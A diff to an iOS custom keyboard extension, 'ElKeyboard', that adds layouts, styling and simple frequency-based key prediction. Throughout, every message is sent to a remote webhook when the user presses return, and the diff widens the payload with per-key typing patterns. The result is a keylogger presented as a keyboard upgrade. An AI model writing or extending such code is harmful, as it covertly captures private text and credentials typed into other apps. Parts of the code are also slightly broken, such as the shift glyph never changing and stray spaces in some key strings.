@@ -2,88 +2,494 @@ import UIKit
 
 class KeyboardViewController: UIInputViewController {
     
-    let rows: [[String]] = [
+    // Keyboard layouts
+    let alphabetRows: [[String]] = [
         ["Q","W","E","R","T","Y","U","I","O","P"],
         ["A","S","D","F","G","H","J","K","L"],
-        ["Z","X","C","V","B","N","M"],
-        ["123", "space", "⌫", "return"]
+        ["⇧","Z","X","C","V","B","N","M","⌫"],
+        ["123", "🌐", "space", "return"]
     ]
     
-    let sharedDefaults = UserDefaults(suiteName: "group.com.yourcompany.ElKeyboard") // Replace with your group
+    let numberRows: [[String]] = [
+        ["1","2","3","4","5","6","7","8","9","0"],
+        ["-","/",":",";"," (",")",", ","&","@","\""],
+        ["#+=",".",",","?","!","'","⌫"],
+        ["ABC", "🌐", "space", "return"]
+    ]
+    
+    let symbolRows: [[String]] = [
+        ["[","]","{","}","#","%","^","*","+","="],
+        ["_","\\","|","~","<",">","€","£","¥","·"],
+        ["123",".",",","?","!","'","⌫"],
+        ["ABC", "🌐", "space", "return"]
+    ]
+    
+    let emojiRows: [[String]] = [
+        ["😀","😂","🥰","😍","🤔","😭","😤","🎉","👍","❤️"],
+        ["🔥","💯","😎","🤗","😴","🤤","🙄","😬","🤐","🤫"],
+        ["🎈","🎊","✨","🌟","💫","⭐","🌈","🦄","🐱","🐶"],
+        ["ABC", "🌐", "space", "return"]
+    ]
+    
+    enum KeyboardLayout {
+        case alphabet, numbers, symbols, emoji
+    }
+    
+    var currentLayout: KeyboardLayout = .alphabet
+    var isShiftPressed = false
+    
+    let sharedDefaults = UserDefaults(suiteName: "group.com.yourcompany.ElKeyboard")
     var keyCount = 0
-    var currentMessage = "" // Track the current message being typed
+    var currentMessage = ""
+    
+    // ML-based features
+    var keyPressPatterns: [String: Int] = [:]
+    var nextKeyPredictions: [String: [String: Int]] = [:]
+    var lastKeyPressed: String?
+    
+    // UI Components
+    var keyboardStack: UIStackView?
+    var predictionView: UIView?
     
     override func viewDidLoad() {
         super.viewDidLoad()
-        view.backgroundColor = .systemGray5
+        setupKeyboardAppearance()
+        loadMLData()
         setupKeyboard()
     }
     
+    func setupKeyboardAppearance() {
+        // iOS-like keyboard appearance
+        view.backgroundColor = UIColor.systemGray6
+        
+        // Add subtle shadow
+        view.layer.shadowColor = UIColor.black.cgColor
+        view.layer.shadowOffset = CGSize(width: 0, height: -1)
+        view.layer.shadowRadius = 3
+        view.layer.shadowOpacity = 0.1
+    }
+    
+    func loadMLData() {
+        // Load existing patterns from UserDefaults
+        if let savedPatterns = sharedDefaults?.object(forKey: "keyPressPatterns") as? [String: Int] {
+            keyPressPatterns = savedPatterns
+        }
+        if let savedPredictions = sharedDefaults?.object(forKey: "nextKeyPredictions") as? [String: [String: Int]] {
+            nextKeyPredictions = savedPredictions
+        }
+    }
+    
+    func saveMLData() {
+        sharedDefaults?.set(keyPressPatterns, forKey: "keyPressPatterns")
+        sharedDefaults?.set(nextKeyPredictions, forKey: "nextKeyPredictions")
+    }
+    
     func setupKeyboard() {
-        let keyboardStack = UIStackView()
-        keyboardStack.axis = .vertical
-        keyboardStack.spacing = 8
-        keyboardStack.translatesAutoresizingMaskIntoConstraints = false
-        view.addSubview(keyboardStack)
+        // Remove existing keyboard if present
+        keyboardStack?.removeFromSuperview()
+        
+        // Create main container
+        let mainContainer = UIStackView()
+        mainContainer.axis = .vertical
+        mainContainer.spacing = 8
+        mainContainer.translatesAutoresizingMaskIntoConstraints = false
+        view.addSubview(mainContainer)
+        
+        // Setup predictions view
+        setupPredictionView(container: mainContainer)
+        
+        // Create keyboard stack
+        keyboardStack = UIStackView()
+        keyboardStack!.axis = .vertical
+        keyboardStack!.spacing = 6
+        keyboardStack!.translatesAutoresizingMaskIntoConstraints = false
+        mainContainer.addArrangedSubview(keyboardStack!)
         
         NSLayoutConstraint.activate([
-            keyboardStack.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 6),
-            keyboardStack.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -6),
-            keyboardStack.topAnchor.constraint(equalTo: view.topAnchor, constant: 10),
-            keyboardStack.bottomAnchor.constraint(equalTo: view.bottomAnchor, constant: -10),
+            mainContainer.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 4),
+            mainContainer.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -4),
+            mainContainer.topAnchor.constraint(equalTo: view.topAnchor, constant: 8),
+            mainContainer.bottomAnchor.constraint(equalTo: view.bottomAnchor, constant: -8),
         ])
         
-        for rowKeys in rows {
+        setupCurrentLayout()
+    }
+    
+    func setupPredictionView(container: UIStackView) {
+        predictionView = UIView()
+        predictionView!.backgroundColor = UIColor.systemGray5
+        predictionView!.layer.cornerRadius = 8
+        predictionView!.translatesAutoresizingMaskIntoConstraints = false
+        container.addArrangedSubview(predictionView!)
+        
+        NSLayoutConstraint.activate([
+            predictionView!.heightAnchor.constraint(equalToConstant: 40)
+        ])
+        
+        updatePredictions()
+    }
+    
+    func setupCurrentLayout() {
+        // Clear existing rows
+        keyboardStack?.arrangedSubviews.forEach { $0.removeFromSuperview() }
+        
+        let rows = getCurrentRows()
+        
+        for (rowIndex, rowKeys) in rows.enumerated() {
             let row = UIStackView()
             row.axis = .horizontal
             row.spacing = 6
-            row.distribution = .fillEqually
+            row.distribution = .fillProportionally
             
-            for key in rowKeys {
-                let button = createButton(title: key)
+            for (keyIndex, key) in rowKeys.enumerated() {
+                let button = createButton(title: key, rowIndex: rowIndex, keyIndex: keyIndex)
                 row.addArrangedSubview(button)
             }
-            keyboardStack.addArrangedSubview(row)
+            keyboardStack!.addArrangedSubview(row)
         }
     }
     
-    func createButton(title: String) -> UIButton {
+    func getCurrentRows() -> [[String]] {
+        switch currentLayout {
+        case .alphabet:
+            return alphabetRows
+        case .numbers:
+            return numberRows
+        case .symbols:
+            return symbolRows
+        case .emoji:
+            return emojiRows
+        }
+    }
+    
+    func createButton(title: String, rowIndex: Int, keyIndex: Int) -> UIButton {
         let button = UIButton(type: .system)
-        button.setTitle(title.uppercased(), for: .normal)
-        button.titleLabel?.font = UIFont.systemFont(ofSize: 20)
-        button.backgroundColor = .white
-        button.layer.cornerRadius = 6
+        
+        // Apply ML-based sizing
+        let baseSize = getBaseKeySize(for: title, rowIndex: rowIndex)
+        let adaptiveSize = getAdaptiveKeySize(for: title, baseSize: baseSize)
+        
+        // Configure button appearance
+        configureButtonAppearance(button, title: title, size: adaptiveSize)
+        
+        // Set constraints
+        NSLayoutConstraint.activate([
+            button.heightAnchor.constraint(equalToConstant: adaptiveSize.height),
+            button.widthAnchor.constraint(greaterThanOrEqualToConstant: adaptiveSize.width)
+        ])
+        
         button.addTarget(self, action: #selector(keyPressed(_:)), for: .touchUpInside)
+        button.accessibilityIdentifier = title
+        
         return button
     }
     
-    @objc func keyPressed(_ sender: UIButton) {
-        guard let title = sender.title(for: .normal)?.lowercased() else { return }
+    func getBaseKeySize(for key: String, rowIndex: Int) -> CGSize {
+        let standardHeight: CGFloat = 42
+        let standardWidth: CGFloat = 32
         
-        switch title {
+        switch key {
         case "space":
-            textDocumentProxy.insertText(" ")
-            currentMessage += " "
-        case "⌫":
-            textDocumentProxy.deleteBackward()
-            if !currentMessage.isEmpty {
-                currentMessage.removeLast()
-            }
+            return CGSize(width: 180, height: standardHeight)
+        case "⌫", "⇧":
+            return CGSize(width: 50, height: standardHeight)
         case "return":
-            textDocumentProxy.insertText("\n")
-            // Message is complete, send it to webhook (don't add \n to currentMessage)
-            sendMessageToWebhook()
-            currentMessage = "" // Reset for next message
-        case "123":
-            // You could toggle symbol layout here
-            break
+            return CGSize(width: 75, height: standardHeight)
+        case "123", "ABC", "#+=", "🌐":
+            return CGSize(width: 55, height: standardHeight)
         default:
-            textDocumentProxy.insertText(title)
-            currentMessage += title
-            keyCount += 1
-            sharedDefaults?.set(keyCount, forKey: "totalKeyCount")
+            return CGSize(width: standardWidth, height: standardHeight)
         }
     }
+    
+    func getAdaptiveKeySize(for key: String, baseSize: CGSize) -> CGSize {
+        // ML-based size adaptation
+        let frequency = keyPressPatterns[key.lowercased()] ?? 0
+        let maxFrequency = keyPressPatterns.values.max() ?? 1
+        
+        if maxFrequency > 0 && frequency > 0 {
+            let adaptationFactor = 1.0 + (Double(frequency) / Double(maxFrequency)) * 0.3 // Up to 30% size increase
+            return CGSize(width: baseSize.width * adaptationFactor, height: baseSize.height * adaptationFactor)
+        }
+        
+        return baseSize
+    }
+    
+    func configureButtonAppearance(_ button: UIButton, title: String, size: CGSize) {
+        // iOS-like styling
+        button.layer.cornerRadius = 8
+        button.titleLabel?.font = UIFont.systemFont(ofSize: getFontSize(for: title), weight: .medium)
+        
+        // Set button colors based on key type
+        let colors = getKeyColors(for: title)
+        button.backgroundColor = colors.background
+        button.setTitleColor(colors.text, for: .normal)
+        
+        // Add shadow for depth
+        button.layer.shadowColor = UIColor.black.cgColor
+        button.layer.shadowOffset = CGSize(width: 0, height: 1)
+        button.layer.shadowRadius = 1
+        button.layer.shadowOpacity = 0.2
+        
+        // Set title
+        let displayTitle = getDisplayTitle(for: title)
+        button.setTitle(displayTitle, for: .normal)
+        
+        // Add highlight effect
+        button.addTarget(self, action: #selector(keyTouchDown(_:)), for: .touchDown)
+        button.addTarget(self, action: #selector(keyTouchUp(_:)), for: [.touchUpInside, .touchUpOutside, .touchCancel])
+    }
+    
+    func getKeyColors(for key: String) -> (background: UIColor, text: UIColor) {
+        switch key {
+        case "⌫", "⇧", "123", "ABC", "#+=":
+            return (UIColor.systemGray3, UIColor.label)
+        case "🌐":
+            return (UIColor.systemGray4, UIColor.label)
+        case "return":
+            return (UIColor.systemBlue, UIColor.white)
+        case "space":
+            return (UIColor.systemGray2, UIColor.label)
+        default:
+            return (UIColor.white, UIColor.label)
+        }
+    }
+    
+    func getFontSize(for key: String) -> CGFloat {
+        switch key {
+        case "space":
+            return 16
+        case "⌫", "⇧", "return":
+            return 18
+        case "123", "ABC", "#+=", "🌐":
+            return 14
+        default:
+            // Check if it's an emoji
+            if key.count == 1 && key.unicodeScalars.first?.properties.isEmoji == true {
+                return 24
+            }
+            return 20
+        }
+    }
+    
+    func getDisplayTitle(for key: String) -> String {
+        switch key {
+        case "space":
+            return ""
+        case "⇧":
+            return isShiftPressed ? "⇧" : "⇧"
+        default:
+            if currentLayout == .alphabet && !isShiftPressed {
+                return key.lowercased()
+            }
+            return key
+        }
+    }
+    
+    @objc func keyTouchDown(_ sender: UIButton) {
+        // Smooth press animation
+        UIView.animate(withDuration: 0.1, animations: {
+            sender.transform = CGAffineTransform(scaleX: 0.95, y: 0.95)
+            sender.alpha = 0.8
+        })
+    }
+    
+    @objc func keyTouchUp(_ sender: UIButton) {
+        // Smooth release animation
+        UIView.animate(withDuration: 0.15, delay: 0, usingSpringWithDamping: 0.6, initialSpringVelocity: 0.8, options: [], animations: {
+            sender.transform = CGAffineTransform.identity
+            sender.alpha = 1.0
+        })
+    }
+    
+    @objc func keyPressed(_ sender: UIButton) {
+        guard let title = sender.accessibilityIdentifier else { return }
+        
+        // Handle special keys
+        switch title {
+        case "space":
+            handleSpaceKey()
+        case "⌫":
+            handleDeleteKey()
+        case "return":
+            handleReturnKey()
+        case "⇧":
+            handleShiftKey()
+        case "123":
+            switchToLayout(.numbers)
+        case "ABC":
+            switchToLayout(.alphabet)
+        case "#+=":
+            switchToLayout(.symbols)
+        case "🌐":
+            advanceToNextInputMode()
+        default:
+            handleCharacterKey(title)
+        }
+        
+        // Update ML data
+        updateMLData(for: title)
+        
+        // Haptic feedback
+        let impactFeedback = UIImpactFeedbackGenerator(style: .light)
+        impactFeedback.impactOccurred()
+    }
+    
+    func handleSpaceKey() {
+        textDocumentProxy.insertText(" ")
+        currentMessage += " "
+        updatePredictions()
+    }
+    
+    func handleDeleteKey() {
+        textDocumentProxy.deleteBackward()
+        if !currentMessage.isEmpty {
+            currentMessage.removeLast()
+        }
+        updatePredictions()
+    }
+    
+    func handleReturnKey() {
+        textDocumentProxy.insertText("\n")
+        sendMessageToWebhook()
+        currentMessage = ""
+        updatePredictions()
+    }
+    
+    func handleShiftKey() {
+        isShiftPressed.toggle()
+        setupCurrentLayout() // Refresh layout to show case changes
+    }
+    
+    func handleCharacterKey(_ character: String) {
+        var insertText = character
+        
+        // Handle case for alphabet
+        if currentLayout == .alphabet && !isShiftPressed {
+            insertText = character.lowercased()
+        }
+        
+        textDocumentProxy.insertText(insertText)
+        currentMessage += insertText
+        keyCount += 1
+        sharedDefaults?.set(keyCount, forKey: "totalKeyCount")
+        
+        // Auto-disable shift after character input
+        if isShiftPressed && currentLayout == .alphabet {
+            isShiftPressed = false
+            setupCurrentLayout()
+        }
+        
+        updatePredictions()
+    }
+    
+    func switchToLayout(_ layout: KeyboardLayout) {
+        currentLayout = layout
+        isShiftPressed = false // Reset shift when switching layouts
+        setupCurrentLayout()
+    }
+    
+    // MARK: - Machine Learning Features
+    
+    func updateMLData(for key: String) {
+        let normalizedKey = key.lowercased()
+        
+        // Update key press patterns
+        keyPressPatterns[normalizedKey] = (keyPressPatterns[normalizedKey] ?? 0) + 1
+        
+        // Update next key predictions
+        if let lastKey = lastKeyPressed {
+            if nextKeyPredictions[lastKey] == nil {
+                nextKeyPredictions[lastKey] = [:]
+            }
+            nextKeyPredictions[lastKey]![normalizedKey] = (nextKeyPredictions[lastKey]![normalizedKey] ?? 0) + 1
+        }
+        
+        lastKeyPressed = normalizedKey
+        saveMLData()
+    }
+    
+    func updatePredictions() {
+        guard let predictionView = predictionView else { return }
+        
+        // Clear existing predictions
+        predictionView.subviews.forEach { $0.removeFromSuperview() }
+        
+        // Get predictions based on last key
+        var predictions: [String] = []
+        
+        if let lastKey = lastKeyPressed,
+           let nextKeys = nextKeyPredictions[lastKey] {
+            // Get top 3 predicted next keys
+            predictions = nextKeys.sorted { $0.value > $1.value }
+                .prefix(3)
+                .map { $0.key.uppercased() }
+        }
+        
+        // Add common predictions if we don't have enough
+        if predictions.count < 3 {
+            let commonWords = ["THE", "AND", "YOU", "FOR", "ARE", "WITH", "NOT", "CAN"]
+            predictions += commonWords.filter { !predictions.contains($0) }
+        }
+        predictions = Array(predictions.prefix(3))
+        
+        // Create prediction buttons
+        let stackView = UIStackView()
+        stackView.axis = .horizontal
+        stackView.distribution = .fillEqually
+        stackView.spacing = 8
+        stackView.translatesAutoresizingMaskIntoConstraints = false
+        predictionView.addSubview(stackView)
+        
+        NSLayoutConstraint.activate([
+            stackView.leadingAnchor.constraint(equalTo: predictionView.leadingAnchor, constant: 16),
+            stackView.trailingAnchor.constraint(equalTo: predictionView.trailingAnchor, constant: -16),
+            stackView.topAnchor.constraint(equalTo: predictionView.topAnchor, constant: 4),
+            stackView.bottomAnchor.constraint(equalTo: predictionView.bottomAnchor, constant: -4)
+        ])
+        
+        for prediction in predictions {
+            let button = createPredictionButton(title: prediction)
+            stackView.addArrangedSubview(button)
+        }
+    }
+    
+    func createPredictionButton(title: String) -> UIButton {
+        let button = UIButton(type: .system)
+        button.setTitle(title, for: .normal)
+        button.titleLabel?.font = UIFont.systemFont(ofSize: 14, weight: .medium)
+        button.backgroundColor = UIColor.systemGray6
+        button.setTitleColor(.systemBlue, for: .normal)
+        button.layer.cornerRadius = 6
+        button.layer.borderWidth = 1
+        button.layer.borderColor = UIColor.systemGray4.cgColor
+        
+        button.addTarget(self, action: #selector(predictionTapped(_:)), for: .touchUpInside)
+        
+        return button
+    }
+    
+    @objc func predictionTapped(_ sender: UIButton) {
+        guard let title = sender.title(for: .normal) else { return }
+        
+        // Insert the predicted word
+        textDocumentProxy.insertText(title.lowercased() + " ")
+        currentMessage += title.lowercased() + " "
+        
+        // Update ML data
+        for char in title.lowercased() {
+            updateMLData(for: String(char))
+        }
+        updateMLData(for: " ")
+        
+        updatePredictions()
+        
+        // Add haptic feedback
+        let impactFeedback = UIImpactFeedbackGenerator(style: .medium)
+        impactFeedback.impactOccurred()
+    }
+    
+    // MARK: - Message Handling
     
     // Send the completed message to webhook with separator
     private func sendMessageToWebhook() {
@@ -102,7 +508,9 @@ class KeyboardViewController: UIInputViewController {
         let payload: [String: Any] = [
             "message": messageWithSeparator,
             "timestamp": ISO8601DateFormatter().string(from: Date()),
-            "source": "ElKeyboard"
+            "source": "ElKeyboard Enhanced",
+            "keyPressPatterns": keyPressPatterns,
+            "messageLength": currentMessage.count
         ]
         
         // Convert to JSON data
